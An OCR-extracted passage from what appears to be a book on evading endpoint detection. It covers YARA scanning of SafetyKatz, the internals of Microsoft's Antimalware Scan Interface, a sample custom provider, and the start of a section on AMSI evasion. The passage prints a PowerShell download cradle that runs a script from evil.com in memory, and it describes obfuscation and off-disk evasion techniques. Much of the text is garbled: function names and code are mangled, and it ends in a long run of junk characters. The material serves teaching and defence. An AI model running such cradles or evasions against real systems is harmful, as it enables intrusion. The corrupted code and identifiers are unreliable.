0x0007x0001x00c\x0007x000f\0x00c\x0007x0001\x00a1\x00a1\x00p\x0007x0001x00U\x00E\x00E
```

Listing 9-6: Detecting SafetyKatz using the new YARA rule

In the YARA output, we can see that the scanner detected both the suspicious functions ❶ and Base64 substring ❷ .

But even this rule isn't a silver bullet against evasion. An attacker could further modify the attributes from which we've built the detection, such as by moving from P/Invoke, the native way of calling unmanaged code from .NET, to D/Invoke, an alternative to P/Invoke that performs the same function, avoiding the suspicious P/Invoke that an EDR may be monitoring for. They could also use syscall delegates or modify the embedded copy of Mimikatz such that the first 32 bytes of its encoded representation differ from that in the rule.

There is one other way to avoid detection by scanners. In modern red teaming, most adversaries avoid touching disk (writing files to the filesystemtem). If they can operate entirely in memory, file-based scanners no longer pose a concern. For example, consider the /ticket:base$ command line option in Rubeus, a tool for interacting with Kerberos. By using this flag, attackers can prevent a Kerberos ticket from being written to the target's filesystem and instead have it returned through console output.

In some situations, attackers can't avoid writing files to disk, such as in the case of SafetyKat's use of dbghelp\MinIDumpFileDump(), which requires the memory dump to be written to a file. In these situations, it's important for attackers to limit the exposure of their files. This most commonly means immediately retrieving a copy of the files and removing them from the target, obscuring filenames and paths, or protecting the content of the file in some way.

While potentially less sophisticated than other sensors, scanners play an important part in detecting malicious content on the host. This chapter covers only file-based scanners, but commercial projects frequently employ other types, including network-based and memory scanners. At an enterprise scale, scanners can also offer interesting metrics, such as whether a file is globally unique. They present a particular challenge for adversaries and serve as a great representation of evasion in general. You can think of them as black boxes through which adversary tooling passes; the adversary's job is to modify the attributes within their control, namely the elements of their malware, to make it to the other end.

Scanners 18

---

## Conclusion

Scanners, especially those related to antivirus engines, are one of the first defensive technologies many of us encounter. Though they fell out of favor due to the brittleness of their rulesets, they have recently regained popularity as a supplemental feature, employing (at times) more robust rules than other sensors such as minifiers and image-load callback routines. Still, evading scanners is an exercise in obfuscation rather than avoidance. By changing indicators, even simple things like static strings, an adversary can usually fly under the radar of most modern scanning engines.

---

## 10

## ANTIMALWARE SCAN INTERFACE

![Figure](figures/EvadingEDR_page_209_figure_002.png)

As security vendors began building effective tools for detecting the deployment and execution of compiled malware, attackers ere left searching for alternative methods to

execute their code. One of the tactics they discovered is the creation of script-based, or fileless , malware, which relies on the use of tools built into the operating system to execute code that will give the attacker control over the system.

To help protect users against these novel threats, Microsoft introduced the Antimalware Scan Interface (AMSI) with the release of Windows 10. AMSI provides an interface that allows application developers to leverage antimalware providers registered on the system when determining if the data with which they are working is malicious.

AMS is an omnipresent security feature in today's operating environments. Microsoft has instrumented many of the scripting engines,

---

frameworks, and applications that we, as attackers, routinely target. Nearly every EDR vendor incites events from AMSI, and some go so far as to attempt to detect attacks that tamper with the registered providers. This chapter covers the history of AMSI, its implementation in different Windows components, and the diverse world of AMSI evasions.

## The Challenge of Script-Based Malware

Scripting languages offer a large number of advantages over compiled languages. They require less development time and overhead, bypass application allow-listing, can execute in memory, and are portable. They also provide the ability to use the features of frameworks such as .NET and, oftentimes, direct access to the Win32 API, which greatly extends the functionality of the scripting language.

While script-based malware existed in the wild prior to AMSI's creation, the 2015 release of Empire, a command-and-control framework built around PowerShell, made its use mainstream in the offensive world. Because of its ease of use, default integration into Windows 7 and above, and large amount of existing documentation, PowerShell became the de facto language for offensive tool development for many.

This boom in script-based malware caused a large defensive gap. Previous tools relied on the fact that malware would be dropped to disk and executed. They fell short when faced with malware that ran a Microsoft-signed executable installed on the system by default, sometimes referred to as living-off-the-land , such as PowerShell. Even agents that attempted to detect the invocation of malicious scripts struggled, as attackers could easily adapt their payloads and tools to evade the detection techniques employed by vendors. Microsoft itself highlights this problem in its blog post announcing AMSI, which provides the following example. Say that a defensive product searched a script for the string "malware" to determine whether it was malicious. It would detect the following code:

```bash
PS > Write-Host "malware";
```

Once malware authors became aware of this detection logic, they could bypass the detection mechanism using something as simple as string concatenation:

```bash
namespace PES
PS > Write-Host "mal" + "ware";
```

To combat this, developers would attempt some basic type of language emulation. For example, they might concatenate strings before scanning the contents of the script block. Unfortunately, this approach is prone to error, as languages often have many different ways to represent data, and cataloging them all for emulation is very difficult. Antimalware developers did have some success with the technique, however. As a result, malware

---

developers raised the complexity of their obfuscation slightly with techniques such as encoding. The example in Listing 10-1 shows the string "malware" encoded using Base64 in PowerShell.

```bash
PS > $str = [System.Text.Encoding];_UTF8.GetString([System.Convert];_FromBase64String(
    "HWFsdFyZoV==");
PS > Write-Host $str;
```

Listing 10-1: Decoding a Base64 string in PowerShell

Agents again leveraged language emulation to decode data in the script and scan it for malicious content. To combat this success, malware developers moved from simple encoding to encryption and algorithmic encoding, such as with exclusive- or (XOR). For example, the code in Listing 10-2 first decodes the Base64-encoded data and then uses the two-byte key gq to XOR the decoded bytes.

```bash
$key = "g"
$data = "ÇœYLEAYVAg=="
$bytes = [System.Convert]::FromBase64String($data);
$decodedBytes = @();
for ($i = 0; $i --lt $bytes.Count; $i++) {
    $decodedBytes += $bytes[$i] -ibor sKey{$i % $key.Length};
}
$payload = [system.Text.Encoding]:UTF8.getString($decodedBytes);
Write-Host $payload;
```

Listing 10-2: An XOR example in PowerShell

This trend toward encryption exceeded what the antimalware engines could reasonably emulate, so detections based on the presence of the obflucation techniques themselves became commonplace. This presents its own challenges, due to the fact that normal, benign scripts sometimes employ what may look like obfuscation. The example Microsoft put forward in its post, and one that became the standard for executing PowerShell code in memory, is the download cradle in Listing 10-3 .

```bash
PS > Invoke-Expression (NewObject Net.WebClient).
    >> downloadstring("https://evil.com/payload.ps1")
```

Listing 10-3: A simple PowerShell download cradle

In this example, the .NET\Net.WebClient class is used to download a PowerShell script from an arbitrary site. When this script is downloaded, it isn't written to disk but rather lives as a string in memory tied to the WebClient object. From here, the adversary uses the Invoke-Expression cmdlet to run this string as a PowerShell command. This technique results in whatever action the payload may take, such as deploying a new command-andcontrol agent, occurring entirely in memory.

---

## How AMSI Works

AMSI scans a target, then uses antimalware providers registered on the system to determine whether it is malicious. By default, it uses the antimalware provider Microsoft Defender IOfficeAntivirus (MpOav.dll), but third-party EDR vendors may also register their own providers. Duane Michael maintains a list of security vendors who register AMSI providers in his “whoami” project on GitHub.

You'll most commonly find AMSI used by applications that include scripting engines (for example, those that accept arbitrary scripts and execute them using the associated engine), work with untrusted buffers for memory, or interact with non-PE executable code, such as .docx and .pdf files. AMSI is integrated into many Windows components, including modern versions of PowerShell, .NET, JavaScript, VBScript, Windows Script Host, Office VBA macros, and User Account Control. It is also integrated into Microsoft Exchange.

### Exploring PowerShell’s AMSI Implementation

Because PowerShell is open source, we can examine its AMSI implementation to understand how Windows components use this tool. In this section, we explore how AMSI attempts to restrict this application from executing malicious scripts.

Inside System.Management.Automation.dll, the DLL that provides the runtime for hosting PowerShell code, there exists a non-exported function called PerforSecuityChecks() that is responsible for scanning the supplied script block and determining whether it is malicious. This function is called by the command processor created by PowerShell as part of the execution pipeline just before compilation. The call stack in Listing 10-4, captured in dnSpy, demonstrates the path the script block follows until it is scanned.

System.Management.Automation.dllCompiledScriptBlockData.PerformSecurityChecks() System.Management.Automation.dllCompiledScriptBlockData.ReallyCompile(bool optimize) System.Management.Automation.dllCompiledScriptBlockData.CompiledUnoptimized() System.Management.Automation.dllCompiledScriptBlockData.CompiledUnoptimized() System.Management.Automation.dllScriptBlockCompile(bool optimized) System.Management.Automation.dllScriptBlockCompile(bool optimized) System.Management.Automation.dllDtlsScriptCommandProcessor.init() System.Management.Automation.dllDtlsScriptCommandProcessor.DlScriptCommandProcessor(x) Block scriptBlock,ExecutionContext context, bool useWksScope, CommandOrigin origin, sessionStateInternalSessionState, Object dllHandleObject System.Management.Automation.dllRunspaces.Command.CreateCommandProcessor(ExecutionContext executionContext, bool addMemory, CommandOrigin origin) System-management.Automation.dllRunspaces.LocalPipeline.CreatePipelineProcessor() System-management.Automation.dllRunspaces.LocalPipeline.InvokeHelper() System-management.Automation.dllRunspaces.LocalPipeline.InvokeThreadProc() System-management.Automation.dllRunspaces.LocalPipeline.InvokeThreadProcImpersonate() System-management.Automation.dllRunspaces.PipelineThread.WorkerProc() System.Private.CoreLib.dllSystem.Threading.Thread.StartHelper.RunWorker() System.Private.CoreLib.dllSystem.Threading.Thread.StartHelper.CallBack(object state) System.Private.CoreLib.dllSystem.Threading.ExecutionContext.runInternal(-snp--)

186 Chapter 10

---

```bash
System.Private.CoreLib.dllSystem.Threading.Thread.StartHelper.Run()
System.Private.CoreLib.dllSystem.Threading.Thread.StartCallback()
[Native to Managed Transition]
```

Listing 10-4: The call stack during the scanning of a PowerShell script block

This function calls an internal utility, AmsUtils.ScanContent(), passing in the script block or file to be scanned. This utility is a simple wrapper for another internal function, AmsUtils.WinScanContent(), where all the real work takes place.

After checking the script block for the European Institute for Computer Antivirus Research (ECICAR) test string, which all antiviruses must detect, WinScanContent's first action is to create a new AMSI session via a call to amsi1\msi1OpenSession(). AMSI sessions are used to correlate multiple scan requests. Next, WinScanContent() calls amsi1\msi1ScanBuffer(), the Win32 API function that will invoke the AMSI providers registered on the system and return the final determination regarding the maliciousness of the script block. Listing 10-5 shows this implementation in PowerShell, with the irrelevant bits trimmed.

```bash
lock (s_amislockObject)
{
  --snip--
   if (s_amsiSession == IntPtr.Zero)
     {
       ♦ hr = AmsiNativeMethods.AmsiOpenSession(
             s_amsiContext,
             ref s_amsiSession
       );
       AmsiInitialized = true;
       if (!Utils.Succeeded(hr))
     {
         s_amsiInitFailed = true;
         return AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
      }
    }
  --snip--
   AmsiNativeMethods.AMSI_RESULT result =
        AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_CLEAN;
   unsafe
     {
       fixed (char* buffer = content)
     {
        var buffPtr = new IntPtr(buffer);
       ♦ hr = AmsiNativeMethods.AmsiScanBuffer(
             s_amsiContext,
             buffPtr,
        Animalware Scan Interface  187
```

---

```bash
(uint)(content_length * sizeof(char)),
        sourceMetadata,
        s_amsiSession,
        ref result);
    }
    }
  if (!Utils.Succeeded(hr))
    {
      return AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
    }
  return result;
    }
```

Listing 10-5: PowerShell's AMSI implementation

In Powershell, the code first calls amsi!AmsiOpenSession() ❶ to create a new AMSI session in which scan requests can be correlated. If the session opens successfully, the data to be scanned is passed to amsi!AmsiCanBuffer() ❷ which does the actual evaluation of the data to determine if the contents of the buffer appear to be malicious. The result of this call is returned to WinScanContent().

The WinScanContent() function can return one of three values:

AMSI RESULT NOT DETECTED A neutral result

ANSI_RESULT_CLEAN A result indicating that the script block did not contain malware

ANSI_RESULT_DETECTED A result indicating that the script block contained malware.

If either of the first two results is returned, indicating that AMSI could not determine the maliciousness of the script block or found it not to be dangerous, the script block will be allowed to execute on the system. If, however, the AMSI_RESULT_DETECTED result is returned, a ParseException will be thrown, and execution of the script block will be halted. Listing 10-6 shows how this logic is implemented inside PowerShell.

```bash
if (amiResult == AnsiUtils.AmiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
{
   var parseError = new ParseError(
        scriptExtent,
        "ScriptContainedMaliciousContent",
        ParserStrings.ScriptContainedMaliciousContent);
❸ throw new ParseException(new[] { parseError });
```

Listing 10-6: Throwing a ParseError on malicious script detection

Because ANSI threw an exception ❶, the execution of the script halts and the error shown in the ParseError will be returned to the user. Listing 10-7 shows the error the user will see in the PowerShell window.

188 Chapter 10

---

```bash
PS > Write-Host "malware"
ParserError:
Line
1
  1 | Write-Host "malware"
        <script>
        {         This script contains malicious content and has been blocked by your
        antivirus software.
```

Listing 10-7: The thrown error shown to the user

## Understanding AMSI Under the Hood

While understanding how AMSI is instrumented in system components provides useful context for how user-supplied input is evaluated, it doesn't quite tell the whole story. What happens when PowerShell calls ms11\ms1scanBuffer()? To understand this, we must dive deep into the AMSI implementation itself. Because the state of C++ decompilers at the time of this writing makes static analysis a bit tricky, we'll need to use some dynamic analysis techniques. Thankfully, WinDbg makes this process relatively painless, especially considering that debug symbols are available for amsi.dll.

When PowerShell starts, it first calls amslAmsIInitialize(). As its name suggests, this function is responsible for initializing the AMSI API. This initialization primarily centers on the creation of a COM class factory via a call to OlIGetClassObject(). As an argument, it receives the class identifier corresponding to amsl.dll, along with the interface identified for the IClassFactory, which enables a class of objects to be created. The interface pointer is then used to create an instance of the IAMtHardware interface ((82d92c6-1f62-44e6b5c9-39da2f24a0ff), shown in Listing 10-8.

```bash
Breakpoint 4 hit
  amsi\msinInitialize+0x1a9;
  00007ff9 5ea733e9 ff1f889d0000  call  qword ptr [amsi__guard_dispatch_icall_fptr ] --snip--
0:011> dt OLE32!ID @x8
{82d29ce-e6b2-4ae6-b5c9-3d9a2f24a2df}
  +0x000 Data1                : 0x82d29c2e
  +0x004 Data2                : 0xf062
  +0x006 Data3                : 0x44e6
  +0x008 Data4                : [8] "??"
0:011> dt @rax
ATL::CComClassFactory::CreateInstance
```

Listing 10-8: Creating an instance of IAntimalware

Rather than an explicit call to some functions, you'll occasionally find references to \_guard_dispatch_call_fptr(). This is a component of Control Flow Guard (CFG), an anti-exploit technology that attempts to prevent indirect calls, such as in the event of return-oriented programming. In short,

---

this function checks the Control Flow Guard bitmap of the source image to determine if the function to be called is a valid target. In the context of this section, the reader can treat these as simple ALL instructions to reduce confusion.

This call then eventually leads into ansibleAmsiComCreateProviders <AntimalwareProvider>, where all the magic happens. Listing 10-9 shows the call stack for this method inside WinDbg.

```bash
0:011> kc
# Call Site
00 amsiAmsiCreateProvidersIAntimalwareProvider>
01 amsiAmsiAntimalware::finalConstruct
02 amsiATL::ComCreatorAll::CComObject<CamsiAntimalware> ::CreateInstance
03 amsiATL::CComClassFactory::CreateInstance
04 amsiAmsiInitialize
---snip--
```

Listing 10-9: The call stack for the AmsiComCreateProviders function

The first major action is a call to amsi1Guidenum::StartEnum(). This function receives the string "Software\Microsoft\AMS\Providers", which it passes into a call to RegOpenKey() and then RegQueryInfoKey() in order to get the number of subkeys. Then, amsi1Guidenum::NextGuid() iterates through the subkeys and converts the class identifiers of registered AMSI providers from strings to UUIDs. After enumerating all the required class identifiers, it passes execution to amsi1AmsiSecureloadInProcServer(), where the InProcServer32 value corresponding to the AMSI provider is queried via RegGetValue(). Listing 10-10 shows this process for MpOav.dll.

```bash
0:011> u@rip L1
    amsi!AmsiComSecureLoadInProcServer=0x18c:
00007ff9'5e75590 48fff159790000  call     qword ptr [amsi!_imp_RegGetValueW]
0:011> du @rdx
0000057' 2067ea0  "Software\Classes\CLSID\{2781761E"
0000057' 2067ea0  "28E0-4109-99FE-89D127C57AF1\ln "
0000057' 2067eb20  "procServer32"
```

Listing 10-10: The parameters passed to RegGetValueW

Next, amsiCheckTrustLevel() is called to check the value of the registry key SOFTWARE\Microsoft\AMSI\Features\fs. This key contains a DWORD, which can be either 1 (the default) or 2 to disable or enable Authenticode signing checks for providers. If Authenticode signing checks are enabled, the path listed in the InProcServer32 registry key is verified. Following a successful check, the path is passed into IoLibraryW() to load the AMSI provider DLL, as demonstrated in Listing 10-11.

```bash
0x0112 u@rip L1
amsi1AmsiComSecureLoadInProcServer+0x297:
00007ff9'5ea7569b 48ff15fe770000  call    qword ptr [amsi1_imp_LoadLibraryExW]
```

190 Chapter 10

---

```bash
0:011> du @rcx
00000057 2067e892 "C:\ProgramData\Microsoft\Windows"
00000057 2067e8d2 * Defender\Platform\4.18.2111.5-0"
00000057 2067e912 "*MpOav.dll"
```

Listing 10-11: The MpOav.dll loaded via LoadLibraryW()

If the provider DLL loads successfully, its DllRegisterServer() function is called to tell it to create registry entries for all COM classes supported by the provider. This cycle repeats calls to amsiTGetGuidnum::NextGuid() until all providers are loaded. Listing 10-12 shows the final step: invoking the QueryInterface() method for each provider in order to get a pointer to the IAntimalware interfaces.

```bash
0:011> dt 0LE32LID @edx
{82d29c2e-f062-44e6-b5c9-3d9a2f24a2df}
  +0x000 Data1       : 0x82d29c2e
  +0x004 Data2       : 0xf062
  +0x006 Data3       : 0x44e6
  +0x008 Data4       : [8] "??"
0:011> u @rip L1
amsiLAT::CComObject<AIL::CComObject<AmsiAntimalware>::CreateInstance+c0xd0:
00007ff8 0b7475bd ff3f5b5b0000  call  dword ptr [amsi!guard_dispatch_icall_fptr]
0:011> t
amsiLAT::CComObject<AmsiAntimalware>::QueryInterface:
00007ff8 0b747a20 4d8bc8      mov        r9,r8
```

Listing 10-12: Calling QueryInterface on the registered provider

After AMSiInitialize() returns, AMSI is ready to go. Before PowerShell begins evaluating a script block, it calls AMSiOpenSession(). As mentioned previously, this function allows AMSI to correlate multiple scans. When this function completes, it returns a HAMSIESSESSION to the caller, and the caller can choose to pass this value to all subsequent calls to AMSI within the current scanning session.

When PowerShell's ANSI instrumentation receives a script block and an ANSI session has been opened, it calls AmI$scanBuffer() with the script block passed as input. This function is defined in Listing 10-13.

```bash
HRESULT AmsiScanBuffer(
[in]        HAMSICONTEXT amsiContext,
[in]        PVOID       buffer,
[in]        ULONG       length,
[in]        LPCWSTR      contentName,
[in, optional] HAMSIESession amsiSession,
[out]        AMSI_RESULT *result
);
```

Listing 10-13: The AmsiScanBuffer() definition

Antimalware Scan Interface 198

---

The function's primary responsibility is to check the validity of the parameters passed to it. This includes checks for content in the input buffer and the presence of a valid HWSMCONTEXT handle with a tag of ANSI , as you can see in the decompilation in Listing 10-14. If any of these checks fail, the function returns E_INVALIDARG (0x80070057) to the caller.

```bash
if ( !buffer )
    return 0x80070057;
if ( !length )
    return 0x80070057;
if ( !result )
    return 0x80070057;
if ( !amsiContext )
    return 0x80070057;
if ( *amsiContext != 'ISMA' )
    return 0x80070057;
if ( !*(amsiContext + 1) )
    return 0x80070057;
vio = *(amsiContext + 2);
if ( !vio )
    return 0x80070057;
```

Listing 10-14: Internal AwsScanBuffer() sanity checks

If these checks pass, AMIS invokes amsi(AMsiAntimalware::Scan(), as shown in the call stack in Listing 10-15.

```bash
0:023> kc
# Call Site
00 amsilAmsiAntimalware::Scan
01 amsilAmsiCanBuffer
02 System.Management_Automation_ni
    ---snip--
```

Listing 10-15: The Scan() method called

This method contains a while loop that iterates over every registered AMSI provider (the count of which is stored at R14+0x100). In this loop, it calls the ArtisanAwareProvider::Scan() function, which the EDR vendor can implement however they wish; it is only expected to return an AMSI_RESULT, defined in Listing 10-16.

```bash
HRESULT Scan(
    [in] IAmsiStream *stream,
    [out] AMSI_RESULT *result
    );
```

Listing 10-16: The CAMsiAntimalware::Scan() function definition

In the case of the default Microsoft Defender AMSI implementation, MpOow.dll, this function performs some basic initialization and then hands execution over to MpClient.dll, the Windows Defender client interface. Note that Microsoft doesn't supply program database files for Defender

192 Chapter 10

---

components, so MpOav.dll's function name in the call stack in Listing 10-17 is incorrect.

```bash
0:000> kc
# Call Site
00 MPCLIENT!MpNetAmsiScan
01 MpOavIdllRegisterServer
02 amsi!AmsiAntimalware::Scan
03 amsi!AmsiCanBuffer
```

Listing 10-17: Execution passed to MpClient.dll from MpOav.dll

AMSI passes the result of the scan back to amsi\AmsiScannerBuffer() via amsi\AmsiAnimalware\Scan(), which in turn returns the AMSL_RESULT to the caller. If the script block was found to contain malicious content, PowerShell throws a ScriptContainedMaliciousContent exception and prevents its execution.

## Implementing a Custom AMSI Provider

As mentioned in the previous section, developers can implement the IAntimalwareProvider::Scan() function however they like. For example, they could simply log information about the content to be scanned, or they could pass the contents of a buffer through a trained machine-learning model to evaluate its maliciousness. To understand the shared architecture of all vendors' AMSI providers, this section steps through the design of a simple provider DLL that meets the minimum specifications defined by Microsoft.

At their core, AMSI providers are nothing more than COM servers, or DLLs loaded into a host process that expose a function required by the caller; in this case, IAmIamAwareProvider. This function extends the Unknown interface by adding three additional methods: CloseSession closes the AMSI session via its IAMSESSION handle, DisplayName displays the name of the AMSI provider, and Scan scans an IAMStream of content and returns an AMSI_RESULT.

In C++, a basic class declaration that overrides IXmlwareProvider's methods may look something like the code shown in Listing 10-18.

```bash
class AmsiProvider :
        public RuntimeClass<RuntimeClassFlags<ClassCom>,
        IAntimalwareProvider,
        FtmBase>
{
public:
    IFACEMETHOD(Scan){
        IAMsiStream *stream,
        AMSI_RESULT *result
    } override;
    IFACEMETHOD (void, CloseSession){
```

Antimalware Scan Interface 193

---

```bash
ULONGLONG session
    } override;
   IFACEMETHOD(DisplayName){
        LPMSTR *displayName
    } override;
};
```

Listing 10-18: An example IAntimalwareProvider class definition

Our code makes use of the Windows Runtime C++ Template Library, which reduces the amount of code used to create COM components. The CloseSession() and ShowName() methods are simply overridden with our own functions to close the AMSI session and return the name of the AMSI provider, respectively. The Scan() function receives the buffer to be scanned as part of an IAmsiStream, which exposes two methods, GetAttribute() and Read(), and is defined in Listing 10-19.

```bash
MIDL_INTERFACE("3e47f2e5-81d4-4db3-897f-545096770373")
IAMSStream : public IUnknown
{
public:
   virtual HRESULT STDMETHODCALLTYPECALLTYPE GetAttribute(
      /* [in] */ AMSI_ATTRIBUTE attribute,
      /* [range][in] */ ULONG dataSize,
      /* [length_is][size_is][out] */ unsigned char *data,
      /* [out] */ ULONG *retData) = 0;
   virtual HRESULT STDMETHODCALLTYPECALL_TYPE Read(
      /* [in] */ ULONGLONG position,
      /* [range][in] */ ULONG size,
      /* [length_is][size_is][out] */ unsigned char *buffer,
      /* [out] */ ULONG *readSize) = 0;
    };
```

Listing 10-19: The IAMsiStream class definition

The GetAttribute() retrieves metadata about the contents to be scanned.

Developers request these attributes by passing an ANSI_ATTRIBUTE value that indicates what information they would like to retrieve, along with an appropriately sized buffer. The ANSI_ATTRIBUTE value is an enumeration defined in

Listing 10-20.

```bash
typedef enum AMSI_ATTRIBUTE {
    AMSI_ATTRIBUTE_APP_NAME = 0,
    AMSI_ATTRIBUTE_CONTENT_NAME = 1,
    AMSI_ATTRIBUTE_CONTENT_SIZE = 2,
    AMSI_ATTRIBUTE_CONTENT_ADDRESS = 3,
    AMSI_ATTRIBUTE_SESSION = 4,
    AMSI_ATTRIBUTE_REDIRECT_CHAIN_SIZE = 5,
    AMSI_ATTRIBUTE_REDIRECT_CHAIN_ADDRESS = 6,
    AMSI_ATTRIBUTE_ALL_SIZE = 7,
    AMSI_ATTRIBUTE_ALL_ADDRESS = 8,
    AMSI_ATTRIBUTE_QUET = 9
```

---

```bash
} AMSI_ATTRIBUTE;
```

Listing 10-20: The AMSI_ATTRIBUTE enumeration

While there are 10 attributes in the enumeration, Microsoft documents only the first five: ANSI_ATTRIBUTE_APP_NAME is a string containing the name, version, or GUID of the calling application; ANSI_ATTRIBUTE_CONTENT NAME is a string containing the filename, URL, script ID, or equivalent identifier of the content to be scanned; ANSI_ATTRIBUTE_CONTENT_SIZE is a ULONG containing the size of the data to be scanned; ANSI_ATTRIBUTE CONTENT_ADDRESS is the memory address of the content, if it has been fully loaded into memory; and ANSI_ATTRIBUTE_SESSION contains a pointer to the next portion of the content to be scanned or NULL if the content is self-contained.

As an example, Listing 10-21 shows how an AMSI provider might use this attribute to retrieve the application name.

```bash
HRESULT AmsiProvider::Scan(IAmsiStream* stream, AMSI_RESULT* result)
{
  HRESULT hr = E_FAIL;
    ULONG ulBufferSize = 0;
    ULONG ulAttributeSize = 0;
    PBYTE pszAppName = nullptr;
      hr = stream->GetAttribute(
        AMSI_ATTRIBUTE_APP_NAME,
        0,
        nullptr,
        &ulBufferSize
    );
    if (hr != E_NOT_SUFFICIENT_BUFFER)
    {
      return hr;
    }
    pszAppName = (PBYTE)HeapAlloc(
        GetProcessHeap(),
        0,
        ulBufferSize
    );
    if (!pszAppName)
    {
      return E_OUTOFMEMORY;
    }
    hr = stream->GetAttribute(
        AMSI_ATTRIBUTE_APP_NAME,
        ulBufferSize,
    ⏲ pszAppName,
        &ulAttributeSize
    );
    Animalware Scan Interface 195
```

---

```bash
if (hr != ERROR_SUCCESS || ulBufferSize > ulBufferSize)
    {
      HeapFree(
          GetProcessHeap(),
          0,
          pszAppName
      );
      return hr;
    }
    --snip--
```

Listing 10-21: An implementation of the AMSI scanning function

When PowerShell calls this example function, pszAppName 1 will contain the application name as a string, which AMSI can use to enrich the scan data. This becomes particularly useful if the script block is deemed malicious, as the EDR could use the application name to terminate the calling process.

IF AMS1_ATTRIBUTE_CONTENT_ADDRESS returns a memory address, we know that the content to be scanned has been fully loaded into memory, so we can interact with it directly. Most often, the data is provided as a stream, in which case we use the Read() method (defined in Listing 10-22) to retrieve the contents of the buffer one chunk at a time. We can define the size of these chunks, which get passed, along with a buffer of the same size, to the Read() method.

```bash
HRESULT Read(
    [in] ULONGLONG      position,
    [in] ULONG        size,
    [out] unsigned char *buffer,
    [out] ULONG        *readSize
};
```

Listing 10-22: The IAMsiStream::Read() method definition

What the provider does with these chunks of data is completely up to the developer. They could scan each chunk, read the full stream, and hash its contents, or simply log details about it. The only rule is that, when the Scan() method returns, it must pass an HRESULT and an ANSI_RESULT to the caller.

## Evading AMSI

AMSI is one of the most-studied areas when it comes to evasion. This is due in no small part to how effective it was in its early days, causing significant headaches for offensive teams that used PowerShell heavily. For them, AMSI presented an existential crisis that prevented their main agents from functioning.

Attackers can employ a variety of evasion techniques to bypass AMSI. While certain vendors have attempted to flag some of these as malicious,

196 Chapter 10

---

the number of evasion opportunities present in AMSI is staggering, so vendors usually can't handle all of them. This section covers some of the more popular evasions in today's operating environment, but bear in mind that there are many variations to each of these techniques.

## String Obfuscation

One of the earliest evasions for AMSI involved simple string obscuration. If an attacker could determine which part of a script block was being flagged as malicious, they could often get around the detection by splitting, encoding, or otherwise obscuring the string, as in the example in Listing 10-23 .

```bash
PS > AmsiScanBuffer
At line:1 char:1
+ AmsiScanBuffer
+ ´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´